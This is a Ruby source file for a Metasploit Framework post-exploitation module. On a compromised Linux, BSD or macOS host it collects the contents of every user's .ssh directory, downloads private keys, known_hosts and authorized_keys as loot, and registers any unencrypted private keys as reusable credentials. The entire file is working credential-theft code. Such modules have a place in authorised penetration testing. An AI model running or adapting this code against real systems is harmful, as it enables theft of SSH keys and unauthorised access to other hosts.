##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/file'
require 'msf/core/post/common'
require 'msf/core/post/unix'
require 'sshkey'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Common
  include Msf::Post::Unix

  def initialize(info={})
    super( update_info(info,
      'Name'           => 'Multi Gather OpenSSH PKI Credentials Collection',
      'Description'    => %q{
          This module will collect the contents of all users' .ssh directories on the targeted
        machine. Additionally, known_hosts and authorized_keys and any other files are also
        downloaded. This module is largely based on firefox_creds.rb.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['Jim Halfpenny'],
      'Platform'       => ['linux', 'bsd', 'unix', 'osx'],
      'SessionTypes'   => ['meterpreter', 'shell' ]
    ))
  end

  def run
    print_status("Finding .ssh directories")
    paths = enum_user_directories.map {|d| d + "/.ssh"}
    # Array#select! is only in 1.9
    paths = paths.select { |d| directory?(d) }

    if paths.nil? or paths.empty?
      print_error("No users found with a .ssh directory")
      return
    end

    download_loot(paths)
  end

  def download_loot(paths)
    print_status("Looting #{paths.count} directories")
    paths.each do |path|
      path.chomp!
      if session.type == "meterpreter"
        sep = session.fs.file.separator
        files = session.fs.dir.entries(path)
      else
        # Guess, but it's probably right
        sep = "/"
        files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)
      end
      path_array = path.split(sep)
      path_array.pop
      user = path_array.pop
      files.each do |file|
        next if [".", ".."].include?(file)
        data = read_file("#{path}#{sep}#{file}")
        file = file.split(sep).last
        loot_path = store_loot("ssh.#{file}", "text/plain", session, data,
          "ssh_#{file}", "OpenSSH #{file} File")
        print_good("Downloaded #{path}#{sep}#{file} -> #{loot_path}")

        # If the key is encrypted, this will fail and it won't be stored as a
        # cred.  That's ok because we can't really use encrypted keys anyway.
        key = SSHKey.new(data, :passphrase => "") rescue nil
        if key and loot_path
          print_status("Saving private key #{file} as cred")
          cred_hash = {
            :host => session.session_host,
            :port => 22,
            :sname => 'ssh',
            :user => user,
            :pass => loot_path,
            :source_type => "exploit",
            :type => 'ssh_key',
            :proof => "KEY=#{key.fingerprint}",
            :duplicate_ok => true,
            :active => true
          }
          report_auth_info(cred_hash)
        end
      end

    end
  end

end
